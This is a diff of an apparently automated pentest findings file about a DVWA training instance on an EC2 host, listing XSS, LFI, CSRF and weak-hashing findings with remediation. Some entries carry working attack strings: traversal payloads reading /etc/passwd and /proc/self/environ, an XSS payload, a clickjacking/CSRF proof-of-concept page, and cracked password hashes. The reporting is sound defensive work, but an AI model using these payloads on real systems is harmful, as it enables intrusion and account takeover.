       "severity": "HIGH",
@@ -1362,7 +1602,7 @@
       "is_validated": true
     },
     {
-      "id": "996d3291-27c2-4241-830f-f9e77f62917b",
+      "id": "65ee7a35-9577-44de-bbce-c538a121489e",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -1415,7 +1655,7 @@
       "is_validated": true
     },
     {
-      "id": "685804fd-1e88-4396-b7e0-bcc5f4fa4cb0",
+      "id": "dce0d5e8-0e35-4f9f-b7b0-4cc5e822f66a",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -1468,7 +1708,7 @@
       "is_validated": true
     },
     {
-      "id": "a691c20e-6c85-4d47-ba2e-2ecf4131e145",
+      "id": "66dd6f79-1ee7-415e-a944-d99b04d01e8f",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -1506,7 +1746,7 @@
       "is_validated": true
     },
     {
-      "id": "44b8bcab-bd5a-44fa-86c8-49d5a43ada08",
+      "id": "4c3d03e9-9abc-4d65-83c9-2bb67a5fbd07",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -1555,7 +1795,7 @@
       "is_validated": true
     },
     {
-      "id": "5544438a-3160-40b4-b316-6dcae1435f42",
+      "id": "db27f869-56e9-4baf-ac5d-1b405ca11c12",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -1604,7 +1844,7 @@
       "is_validated": true
     },
     {
-      "id": "b428b18b-79bd-41b1-9059-4b260c7e8cf9",
+      "id": "ceb55818-f2c4-4c65-860c-2358fbc9b34f",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -1653,7 +1893,7 @@
       "is_validated": true
     },
     {
-      "id": "49de0ec2-eb29-4754-9c51-9dc02962097d",
+      "id": "9680a2bd-09e9-4628-98e1-afe87f42666f",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -1702,7 +1942,7 @@
       "is_validated": true
     },
     {
-      "id": "472c2947-96a4-49d8-89f6-ee0ce63f9f95",
+      "id": "bd805ff9-7086-47b4-84e9-37420b57f99a",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -1751,7 +1991,7 @@
       "is_validated": true
     },
     {
-      "id": "c069ca6a-a91d-48b9-89c4-9f6487997e82",
+      "id": "11396203-0359-47bf-8133-b619625ede0f",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -1800,7 +2040,7 @@
       "is_validated": true
     },
     {
-      "id": "88070c57-42d9-4fa4-8d56-cfbfc544fff6",
+      "id": "88a6043c-015b-4266-ba11-ddc26d1a9869",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -1849,7 +2089,7 @@
       "is_validated": true
     },
     {
-      "id": "d4b088c5-fc5f-4fc7-bdf4-f26e357293ec",
+      "id": "1627a3c6-ce73-41e2-af02-1410418e39a9",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -1898,7 +2138,7 @@
       "is_validated": true
     },
     {
-      "id": "9f3168ff-160c-4c4c-a841-a2ccde76e09a",
+      "id": "aeacbb77-68ba-4b87-bbed-8712a859a450",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -1947,7 +2187,7 @@
       "is_validated": true
     },
     {
-      "id": "2beb9963-3dc9-42e9-8603-d1313c026a4a",
+      "id": "8309c2b8-1055-484c-8bef-e3fab73d3c32",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -1996,7 +2236,7 @@
       "is_validated": true
     },
     {
-      "id": "1f046d28-2817-4cf5-862d-826b5e9959c9",
+      "id": "0478e7b8-a0ca-4e77-b157-2d18bd3baf0e",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -2045,7 +2285,7 @@
       "is_validated": true
     },
     {
-      "id": "78cbbfa8-8b8c-4f77-9c9a-16adae3a7019",
+      "id": "00e53686-8594-497b-b90a-d58c82b26fff",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -2094,7 +2334,7 @@
       "is_validated": true
     },
     {
-      "id": "ecc24086-326f-4648-83e4-2de04804e847",
+      "id": "fbf3dfaf-5d6c-4137-92c1-ce4e2e8b7565",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -2143,7 +2383,7 @@
       "is_validated": true
     },
     {
-      "id": "5d7c0be7-5837-49fc-aa5d-c894573eeec0",
+      "id": "3485da99-fdf0-4bd3-a269-c99ccc6aff83",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -2192,7 +2432,7 @@
       "is_validated": true
     },
     {
-      "id": "d2004190-d696-41e2-a4fc-9712af3df1e2",
+      "id": "0480bc16-8e32-486f-a157-4985d8db04bf",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -2241,7 +2481,7 @@
       "is_validated": true
     },
     {
-      "id": "d2e6386a-f318-4d77-bfbb-642e5523e53c",
+      "id": "8dabef99-404e-42a7-b601-b842c4a396d1",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -2290,7 +2530,7 @@
       "is_validated": true
     },
     {
-      "id": "1f1787ed-c368-4db5-8e57-8d180a72862b",
+      "id": "0301c6f5-7af8-4a3f-ae98-4d4e899c3330",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -2339,121 +2579,137 @@
       "is_validated": true
     },
     {
-      "id": "d1d6c2f7-750e-4ce9-a910-85bf34cafa1c",
+      "id": "a6cbaf60-21e5-49b5-99df-cfada692fb8f",
       "source": "autopentest",
       "phase": 3,
       "severity": "HIGH",
-      "category": "WSTG-CONF-04",
-      "title": "Application Configuration File Publicly Accessible (/config/config.inc.php)",
-      "description": "The file /config/config.inc.php is publicly accessible over HTTP without authentication (HTTP 200). The file contains repeated AWS credential placeholder comments (# aws_access_key_id = AKIA&lt;YOUR_KEY_ID_HERE&gt; / # aws_secret_access_key = &lt;YOUR_SECRET_HERE&gt;) and an EOFaws heredoc terminator, indicating this file is the designated location for real AWS credentials in deployment. While the current deployment uses placeholders, the file is entirely unprotected by Apache access controls, meaning any real credentials placed here would be immediately exfiltrated. Additionally, .gitignore (HTTP 200) is publicly accessible and reveals internal path structure. Cross-referenced with WSTG-CONF-04 and WSTG-CONF-09 (consolidated finding \u2014 same root cause and URL).",
+      "category": "WSTG-INPV-01",
+      "title": "Reflected Cross-Site Scripting (XSS) in name Parameter",
+      "description": "The 'name' parameter in GET /vulnerabilities/xss_r/ is reflected into the HTML response inside a &lt;pre&gt; element without encoding or sanitization. An attacker can craft a malicious URL containing arbitrary JavaScript that executes in the victim's browser when clicked. The server sets X-XSS-Protection: 0, explicitly disabling the browser's built-in XSS filter. Cookie theft, session hijacking, and arbitrary DOM manipulation are all possible.",
       "resource_type": "url",
-      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/config/config.inc.php",
-      "remediation_summary": "1. Deny HTTP access to /config/ directory via Apache .htaccess or server config: Deny from all. 2. Remove /config/config.inc.php from the web root entirely \u2014 config files should not be in the document root. 3. Remove .gitignore from the web root. 4. Audit all files in the document root for inadvertent information disclosure. 5. Ensure real AWS credentials are never placed in web-accessible files; use IAM instance roles or AWS Secrets Manager instead.",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/xss_r/",
+      "remediation_summary": "HTML-encode all user-supplied input before reflection into HTML responses using htmlspecialchars() with ENT_QUOTES flag in PHP. Remove the X-XSS-Protection: 0 header or set it to X-XSS-Protection: 1; mode=block. Implement a strong Content-Security-Policy that disallows inline scripts.",
       "remediation_cli": null,
       "compliance_mappings": null,
       "confidence": 1.0,
       "is_validated": false
     },
     {
-      "id": "7a39d12d-7c91-40fd-b108-dacc0da2db98",
+      "id": "2d751fba-c959-4062-a2fa-b2f78ba6f357",
       "source": "autopentest",
       "phase": 3,
       "severity": "HIGH",
-      "category": "WSTG-ATHZ-02",
-      "title": "Unauthenticated Access to Administrative Setup Page (setup.php)",
-      "description": "The DVWA setup page (setup.php) is accessible without authentication. This page exposes sensitive server configuration details including: PHP version (7.0.30-0+deb9u1), database backend (MySQL), database name (dvwa), database host (127.0.0.1), database username (app), operating system (*nix), and web server hostname. The page also reveals whether URL inclusion is enabled and provides a \"Create / Reset Database\" button that would allow an unauthenticated attacker to reset the entire application database including admin credentials. The authorization check that protects all other DVWA pages does not apply to setup.php. Additionally, about.php and instructions.php are accessible without authentication, though these expose lower-risk information.",
+      "category": "WSTG-INPV-02",
+      "title": "Stored Cross-Site Scripting (XSS) in Guestbook Message",
+      "description": "The 'mtxMessage' parameter in POST /vulnerabilities/xss_s/ stores user input in a database and renders it unencoded to all visitors of the guestbook page. An attacker can inject persistent JavaScript that executes in every victim's browser upon visiting the page. Multiple script payloads were confirmed stored from prior testing. Cookie theft and session hijacking affects all authenticated users who visit the page.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/xss_s/",
+      "remediation_summary": "HTML-encode stored user content before rendering using htmlspecialchars() with ENT_QUOTES. Implement input validation to reject or strip HTML tags from the mtxMessage and txtName fields. Apply a Content-Security-Policy that disallows inline scripts. Consider using a stored XSS sanitization library such as HTML Purifier.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "f66ec1aa-0baa-45ec-880b-4db64672dcc5",
+      "source": "autopentest",
+      "phase": 3,
+      "severity": "HIGH",
+      "category": "WSTG-CLNT-01",
+      "title": "DOM-Based Cross-Site Scripting (XSS) via document.write Sink",
+      "description": "The 'default' parameter in GET /vulnerabilities/xss_d/ is read from document.location.href via JavaScript and passed directly to document.write() without sanitization. An attacker can break out of the &lt;option&gt;&lt;/select&gt; context and inject arbitrary HTML/JS (e.g., &lt;img src=x onerror=alert(1)&gt;) that executes client-side when the browser processes the written DOM. This is a server-confirmed DOM XSS sink \u2014 the vulnerable JavaScript source code is present in the server response and the URL parameter is not processed server-side, meaning WAFs and server-side filters offer no protection.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/xss_d/",
+      "remediation_summary": "Replace document.write() with safe DOM manipulation methods (createElement, textContent). Validate and allowlist the 'default' parameter server-side against known language values (English, French, Spanish, German). Use DOMPurify client-side if dynamic HTML insertion is required. Remove X-XSS-Protection: 0 header.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "dc188565-145e-4d25-a543-ce5b29aebcfd",
+      "source": "autopentest",
+      "phase": 3,
+      "severity": "HIGH",
+      "category": "WSTG-INPV-01",
+      "title": "CSP Bypass via Script Source Injection (pastebin.com Allowlisted)",
+      "description": "The 'include' parameter in POST /vulnerabilities/csp/ is placed directly into a &lt;script src='...'&gt; tag without any validation. The Content-Security-Policy explicitly permits scripts from https://pastebin.com. An attacker can upload arbitrary JavaScript to pastebin.com and submit the raw URL as the 'include' parameter \u2014 the browser will fetch and execute the attacker-controlled script because both the src injection succeeds and the CSP allowlist permits pastebin.com. This renders the CSP completely ineffective for this endpoint.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/csp/",
+      "remediation_summary": "Validate the 'include' parameter server-side against a strict allowlist of trusted script URLs. Remove pastebin.com (and other user-controllable content hosts) from the CSP script-src directive. Use 'nonce' or 'hash' based CSP instead of domain-based allowlists. Never allow user input to control script src attributes.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "49be380c-05f1-4709-9046-9c75dc254c5a",
+      "source": "autopentest",
+      "phase": 3,
+      "severity": "HIGH",
+      "category": "WSTG-INPV-04",
+      "title": "Local File Inclusion (LFI) \u2014 Arbitrary File Read via Path Traversal",
+      "description": "The `/vulnerabilities/fi/` endpoint accepts a `page` parameter that is passed directly to PHP's file include function without sanitization. An unauthenticated attacker (or low-privilege user) can traverse outside the web root and read arbitrary files from the server filesystem.\n\n**Confirmed techniques:**\n1. Direct traversal with 5 sequences: `../../../../../etc/passwd` \u2014 CONFIRMED\n2. Direct traversal with 6 sequences: `../../../../../../etc/passwd` \u2014 CONFIRMED (primary PoC)\n3. URL-encoded traversal: `..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd` \u2014 CONFIRMED\n4. PHP filter wrapper (base64): `php://filter/convert.base64-encode/resource=/etc/passwd` \u2014 CONFIRMED (bypasses in-page rendering, exfiltrates raw file bytes)\n5. `/etc/os-release` readable \u2014 system: Debian GNU/Linux 9 (stretch)\n6. `/proc/self/environ` accessible \u2014 environment variable exposure\n\n**Bypass attempts (5):**\n- `....//` double-slash filter bypass \u2014 NOT effective (security=low has no filter)\n- Double URL-encoding `%252F` \u2014 NOT effective (server does not double-decode)\n- `http://` RFI scheme \u2014 blocked\n- `data://` PHP wrapper \u2014 blocked\n- PHP filter wrapper \u2014 CONFIRMED EFFECTIVE\n\n**Queue entries consolidated:** PT-001 and PATH_TRAVERSAL-001 (same endpoint, same vulnerability).",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/fi/",
+      "remediation_summary": "1. **Whitelist approach**: Replace free-form file inclusion with a whitelist of allowed page names. Map user-supplied values to filenames using a lookup table \u2014 never pass user input directly to include/require.\n2. **Input sanitization**: Strip `../`, `..%2F`, `..%252F`, and null bytes from the `page` parameter before use.\n3. **PHP configuration**: Set `open_basedir` in php.ini to restrict file access to the web root directory. Disable `allow_url_include` and `allow_url_fopen` to prevent RFI.\n4. **Principle of least privilege**: Run the web server as a low-privilege user (`www-data`) with no read access to sensitive files like `/etc/shadow`, `/proc/self/environ`, or private keys.\n5. **WAF/IDS**: Deploy a WAF rule to block path traversal sequences in query parameters.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "ff264a65-c567-42e2-bcd4-30550ec0a74a",
+      "source": "autopentest",
+      "phase": 3,
+      "severity": "HIGH",
+      "category": "WSTG-BUSL-06",
+      "title": "Database Reset Accessible to All Authenticated Users via setup.php",
+      "description": "The /setup.php page allows any authenticated user to reset the entire application database via a POST request. This is a critical administrative function that should be restricted to administrators only, but no role-based access control prevents any authenticated user from triggering a full database reset. This could be abused to destroy all application data (users, entries, findings in a real application) as a destructive denial-of-service attack, or to reset security configurations to defaults for follow-on attacks.",
       "resource_type": "url",
       "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/setup.php",
-      "remediation_summary": "Enforce authentication checks on setup.php consistent with all other authenticated pages. Move setup functionality behind admin-level access controls. Consider removing or disabling setup.php entirely in production deployments. The page should check for a valid authenticated session before rendering any content or accepting POST requests.",
+      "remediation_summary": "1. Restrict /setup.php to admin role only with explicit role checking before processing the request. 2. Remove setup.php from production deployments - it should only be available during initial setup. 3. Add a multi-step confirmation or re-authentication requirement before performing destructive operations. 4. Log all database reset attempts with the requesting user's identity.",
       "remediation_cli": null,
       "compliance_mappings": null,
       "confidence": 1.0,
       "is_validated": false
     },
     {
-      "id": "a7e5257d-2c37-4a5e-b9f0-357587e37563",
+      "id": "946a1ddf-10b6-411a-8926-5a3708a357d2",
       "source": "autopentest",
       "phase": 3,
       "severity": "HIGH",
-      "category": "WSTG-ATHZ-03",
-      "title": "Security Level Bypass via Client-Controlled Cookie (security=low)",
-      "description": "DVWA's security level (low/medium/high/impossible) is stored in a client-controlled cookie named \"security\" rather than server-side session state. Any authenticated user can freely modify this cookie value to change the application's security posture without server-side validation. This means:\n1. An admin who sets security=high (intending to restrict exploitation) can have their setting overridden by any authenticated user simply setting security=low in their browser.\n2. The security cookie is trusted entirely client-side \u2014 the server applies whichever level the client presents.\n\nProof: With the same valid session (PHPSESSID), changing the security cookie from \"low\" to \"high\" changes which SQL injection code path executes. Setting it back to \"low\" immediately re-enables the vulnerable code path, confirming the server applies no independent server-side security level per session.\n\nThis means all security hardening intended by the administrator can be trivially bypassed by any authenticated user, rendering the \"high\" and \"impossible\" security levels ineffective as access controls.",
+      "category": "WSTG-CRYP-04",
+      "title": "Weak Password Hashing \u2014 Unsalted MD5 Enables Instant Credential Cracking",
+      "description": "All DVWA user passwords are stored as unsalted MD5 hashes. The SQLi exploitation (FINDING-035) extracted the full users table, revealing the following hash\u2192plaintext mappings that are immediately reversible via rainbow tables with no computational effort:\n\n- admin: 5f4dcc3b5aa765d61d8327deb882cf99 \u2192 \"password\"\n- gordonb: e99a18c428cb38d5f260853678922e03 \u2192 \"abc123\"\n- 1337: 8d3533d75ae2c3966d7e0d4fcc69216b \u2192 \"charley\"\n- pablo: 0d107d09f5bbe40cade3de5c71e9e9b7 \u2192 \"letmein\"\n- smithy: 5f4dcc3b5aa765d61d8327deb882cf99 \u2192 \"password\"\n\nMD5 without salt provides no protection: (1) identical passwords produce identical hashes, revealing shared credentials (admin and smithy use the same password); (2) MD5 is extremely fast to compute, enabling billions of attempts per second with commodity hardware; (3) all five extracted hashes match entries in public rainbow tables, meaning the plaintext passwords were recovered instantly without brute force.\n\nComplete attack chain: SQL Injection (FINDING-035) \u2192 full credential database dump \u2192 unsalted MD5 hashes \u2192 instant rainbow table reversal \u2192 plaintext passwords \u2192 account takeover for all 5 user accounts. This chain is fully weaponized with evidence already in hand.",
       "resource_type": "url",
-      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/security.php",
-      "remediation_summary": "Store the security level in server-side session state rather than a client-controlled cookie. The security level should be set once by an administrator and stored in the PHP session ($_SESSION['security']), not read from $_COOKIE['security'] on each request. Users should not be able to influence their own security level.",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/",
+      "remediation_summary": "1. Replace MD5 with bcrypt, Argon2id, or scrypt for password hashing (PHP: password_hash($password, PASSWORD_BCRYPT))\n2. Add a per-user random salt (built into bcrypt/Argon2id automatically)\n3. Force a password reset for all existing accounts since all plaintext passwords are now known\n4. Implement password complexity requirements to prevent trivially weak passwords like \"password\"",
       "remediation_cli": null,
       "compliance_mappings": null,
       "confidence": 1.0,
       "is_validated": false
     },
     {
-      "id": "6083f1ba-e132-40b4-aa16-5be85a31e972",
+      "id": "854a4542-f0bc-4987-a00c-1e808233d0d8",
       "source": "autopentest",
       "phase": 3,
       "severity": "HIGH",
-      "category": "WSTG-SESS-03",
-      "title": "Session Fixation - PHPSESSID Not Rotated After Authentication",
-      "description": "DVWA does not issue a new session identifier upon successful user authentication. The PHPSESSID assigned before login remains unchanged after the user authenticates, enabling session fixation attacks. An attacker who can fix a victim's session token (e.g., via a URL parameter if trans_sid were enabled, or via subdomain cookie injection) would be able to hijack the authenticated session without knowing the victim's credentials.\n\nEvidence: Pre-login PHPSESSID `0hd80hcaic4514t1kcbm1q32f2` remained identical post-login (cookie jar comparison). The server issued a 302 redirect to index.php on successful login but did NOT issue a new Set-Cookie: PHPSESSID header, confirming the session ID was reused.",
-      "resource_type": "url",
-      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/login.php",
-      "remediation_summary": "Call session_regenerate_id(true) immediately after successful authentication in login.php. The 'true' parameter deletes the old session file. Example: if (valid_credentials) { session_regenerate_id(true); $_SESSION['user'] = $username; }",
-      "remediation_cli": null,
-      "compliance_mappings": null,
-      "confidence": 1.0,
-      "is_validated": false
-    },
-    {
-      "id": "5fd66d9f-bac0-4c62-a226-aec06617fb75",
-      "source": "autopentest",
-      "phase": 3,
-      "severity": "HIGH",
-      "category": "WSTG-ATHN-02",
-      "title": "Multiple Default/Weak Credentials Active on All DVWA User Accounts",
-      "description": "All five DVWA user accounts use well-known default or trivially weak passwords that are publicly documented. All credentials were verified as valid: gordonb/abc123, 1337/charley, pablo/letmein, smithy/password (admin password also confirmed working). These credentials are the factory defaults for DVWA and are known to any attacker familiar with the platform. The admin account username is \"Admin\" (capital A) while the login form is case-sensitive.",
-      "resource_type": "url",
-      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/login.php",
-      "remediation_summary": "Change all default passwords to strong, unique passwords. Implement a password policy enforcing minimum length (12+ chars), complexity, and preventing use of well-known default passwords. Disable or remove demo/test accounts not needed in production.",
-      "remediation_cli": null,
-      "compliance_mappings": null,
-      "confidence": 1.0,
-      "is_validated": false
-    },
-    {
-      "id": "a3d75947-964e-41f5-bb8e-d3b0de4ac0c6",
-      "source": "autopentest",
-      "phase": 3,
-      "severity": "HIGH",
-      "category": "WSTG-SESS-05",
-      "title": "Cross-Site Request Forgery (CSRF) on Password Change Endpoint",
-      "description": "The password change functionality at /vulnerabilities/csrf/ accepts GET requests with no CSRF token validation. An authenticated user can have their password changed by visiting a malicious link or loading a page containing a crafted URL. No CSRF token, Referer check, or any anti-forgery mechanism is present. Additionally, the form does not require the current/old password before accepting a new one, making account takeover trivial \u2014 an attacker with a valid session (e.g., via session hijacking or XSS) can change the password without knowing the original. Password change was confirmed successful via direct unauthenticated GET request with only session cookie. This vulnerability was also confirmed under WSTG-ATHN-09.",
+      "category": "WSTG-CLNT-09",
+      "title": "Vulnerability Chain: Clickjacking + CSRF = Silent Password Change via Framed UI",
+      "description": "The combination of Clickjacking (FINDING-043: no X-Frame-Options) and CSRF on the password change endpoint (FINDING-021: no CSRF token required, GET method) creates a fully weaponized silent password change attack requiring only one victim click.\n\nAttack chain:\n1. Attacker creates a malicious webpage with an invisible iframe containing the DVWA password change URL: http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/csrf/?password_new=attacker123&password_conf=attacker123&Change=Change\n2. The iframe is positioned transparently over a visible \"Click here to claim your prize\" button on the attacker's page\n3. When a logged-in DVWA user visits the attacker's page and clicks the decoy button, the hidden iframe fires the GET request\n4. The browser sends the victim's PHPSESSID cookie automatically (same-site restrictions do not apply for HTTP)\n5. DVWA processes the request \u2014 password changed to \"attacker123\" with no CSRF token required\n6. The attacker logs in with the victim's username and new password\n\nProof-of-concept HTML:\n```html\n<html><body>\n  Click here to claim your prize!<br>\n  <iframe src=\"http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/csrf/?password_new=attacker123&password_conf=attacker123&Change=Change\" \n    style=\"opacity:0; position:absolute; top:0; left:0; width:100%; height:100%\">\n  </iframe>\n  <button>Claim Prize</button>\n</body></html>\n```\n\nIndividual severity: Clickjacking = Medium, CSRF = High. Chained severity = High (complete account takeover with one click).",
       "resource_type": "url",
       "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/csrf/",
-      "remediation_summary": "1. Switch the form method from GET to POST to prevent URL-based attacks. 2. Implement synchronizer token pattern: generate a per-session CSRF token, embed it in the form as a hidden field, validate it server-side on every state-changing request. 3. Consider adding SameSite=Strict to session cookies to block cross-site requests. 4. Require the current password to be entered when changing the password (defense-in-depth).",
+      "remediation_summary": "1. Add X-Frame-Options: DENY or CSP frame-ancestors 'none' to prevent framing (fixes Clickjacking root cause)\n2. Add CSRF tokens to all state-changing forms, especially password change (fixes CSRF root cause)\n3. Require current password verification before allowing password changes\n4. Switch password change endpoint from GET to POST (GET parameters should never trigger state changes)",
       "remediation_cli": null,
       "compliance_mappings": null,
       "confidence": 1.0,
       "is_validated": false
     },
     {
-      "id": "3cf9afb1-875f-4766-8df4-b5d0d577a22d",
+      "id": "6ce947a8-6755-4014-b189-255a58ac4702",
       "source": "autopentest",
-      "phase": 3,
-      "severity": "HIGH",
-      "category": "WSTG-ATHN-09",
-      "title": "Password Change Function Has No CSRF Protection and No Current Password Verification",
-      "description": "The password change functionality at /vulnerabilities/csrf/ uses the HTTP GET method and requires no CSRF token. An authenticated user's password can be changed by any webpage they visit while logged in \u2014 a classic CSRF attack. Additionally, the form does not require the user's current password to be entered before setting a new one, making account takeover trivial once CSRF is exploited. The change was confirmed successful via direct GET request with only the new password parameters.",
-      "resource_type": "url",
-      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/csrf/",
-      "remediation_summary": "1. Change password change functionality to use POST method. 2. Implement a synchronizer CSRF token on the form. 3. Require the user's current password before accepting a new password. 4. Implement SameSite=Strict or SameSite=Lax on session cookies. Note: This is an intentional vulnerability in DVWA for training purposes.",
-      "remediation_cli": null,
-      "compliance_mappings": null,
-      "confidence": 1.0,
-      "is_validated": false
-    },
-    {
-      "id": "c5a86cd2-34c0-4b20-b92a-247f7d81bb70",
-      "source": "autopentest",
-      "phase": 3,
+      "phase": 1,
       "severity": "INFO",
       "category": "WSTG-CONF-11",
       "title": "AWS Instance Metadata Service (IMDS) Accessible \u2014 SSRF Impact Amplified",
@@ -2467,9 +2723,9 @@
       "is_validated": false
     },
     {
-      "id": "372945a3-9dea-4dd4-b558-7d00b6bfae72",
+      "id": "86557873-32cc-411e-bf2e-20234be3c622",
       "source": "autopentest",
-      "phase": 3,
+      "phase": 1,
       "severity": "INFO",
       "category": "WSTG-SESS-11",
       "title": "Security Level Controlled Entirely by Client-Supplied Cookie (security= cookie trusted without server-side validation)",
@@ -2483,7 +2739,23 @@
       "is_validated": false
     },
     {
-      "id": "87188c19-126d-4bcf-ab12-09e5b2dd2f89",
+      "id": "9e4efce9-aa4c-4134-ad60-bdc5bb09892c",
+      "source": "autopentest",
+      "phase": 1,
+      "severity": "INFO",
+      "category": "WSTG-INFO-05",
+      "title": "AWS Credential Placeholder Comments in HTTP Response Bodies",
+      "description": "Every HTTP response body on the target includes a block of text containing AWS credential comment placeholders embedded after the PHP closing tag (?>). The text includes: '# TODO: remove before pushing', '# aws_access_key_id = AKIA&lt;YOUR_KEY_ID_HERE&gt;', '# aws_secret_access_key = &lt;YOUR_SECRET_HERE&gt;', followed by 'EOFaws'. While these are placeholder values and not real credentials, this indicates the application was deployed with a scripted credential injection step that left residual text. The pattern is consistent with a Bash heredoc that was intended to inject real secrets but contains only placeholders. This should be investigated to confirm no real credentials are exposed in any variant of these files.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/",
+      "remediation_summary": "Remove the TODO comment blocks from all PHP files. Investigate whether any variant of config.inc.php or related files contains real AWS credentials. Audit git history if a repository exists.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "adc87e01-39f1-4c60-86eb-f7a65a68ce5d",
       "source": "autopentest",
       "phase": 1,
       "severity": "LOW",
@@ -2499,7 +2771,7 @@
       "is_validated": false
     },
     {
-      "id": "2f553054-67c1-42e3-891d-773838d95db7",
+      "id": "4095ef50-5187-4923-bcfb-0abb30193595",
       "source": "autopentest",
       "phase": 1,
       "severity": "LOW",
@@ -2515,7 +2787,39 @@
       "is_validated": false
     },
     {
-      "id": "62670ebc-3182-4dc2-8aab-2ea48bf9cd96",
+      "id": "0f1ace6a-a17b-4723-bd54-69f39bd10dc4",
+      "source": "autopentest",
+      "phase": 1,
+      "severity": "LOW",
+      "category": "WSTG-CONF-14",
+      "title": "Multiple Security Headers Missing (X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy)",
+      "description": "The application does not set any of the recommended HTTP security response headers on its pages. The following headers are entirely absent across all tested pages (/login.php, /index.php, /):\n\n- X-Frame-Options: Missing \u2014 allows the application to be embedded in iframes, enabling clickjacking attacks (no frame-ancestors CSP either).\n- X-Content-Type-Options: nosniff \u2014 Missing \u2014 allows MIME-type sniffing which can lead to content injection (e.g., serving a JS file as image/gif and having the browser execute it).\n- X-XSS-Protection: Missing \u2014 legacy IE/Chrome header, absence is low risk on modern browsers but indicates no security header hygiene.\n- Referrer-Policy: Missing \u2014 full URL referrer leaked to third parties on navigation, which can expose session context in URLs.\n- Permissions-Policy (Feature-Policy): Missing \u2014 no restrictions on browser feature access (camera, microphone, geolocation).\n- Strict-Transport-Security: N/A \u2014 site runs on HTTP only (no HTTPS), so HSTS cannot be set (already logged as FINDING-003).\n- Content-Security-Policy: Absent (logged separately as FINDING-013).\n\nThe most impactful missing headers in this context are X-Frame-Options (clickjacking) and X-Content-Type-Options (MIME sniffing).",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/",
+      "remediation_summary": "Add the following headers to Apache configuration (httpd.conf or .htaccess):\nHeader always set X-Frame-Options \"SAMEORIGIN\"\nHeader always set X-Content-Type-Options \"nosniff\"\nHeader always set X-XSS-Protection \"1; mode=block\"\nHeader always set Referrer-Policy \"strict-origin-when-cross-origin\"\nHeader always set Permissions-Policy \"geolocation=(), microphone=(), camera=()\"\nAdditionally, enable mod_headers in Apache and ensure the Header directive is in a context that applies to all responses. Long-term, migrate to HTTPS and add Strict-Transport-Security with includeSubDomains and preload.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "d3715fc7-1996-493e-92d5-cddb5b68f7aa",
+      "source": "autopentest",
+      "phase": 1,
+      "severity": "LOW",
+      "category": "WSTG-INFO-03",
+      "title": ".gitignore Publicly Accessible - Sensitive File Paths Disclosed",
+      "description": "The .gitignore file at the web root is publicly accessible and reveals the existence and paths of sensitive files: 'config/config.inc.php' (the application configuration file containing database credentials) and 'Dockerfile' (the container build file). This disclosure assists attackers in directly targeting these files. The config.inc.php.bak backup was successfully accessed after this disclosure.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/.gitignore",
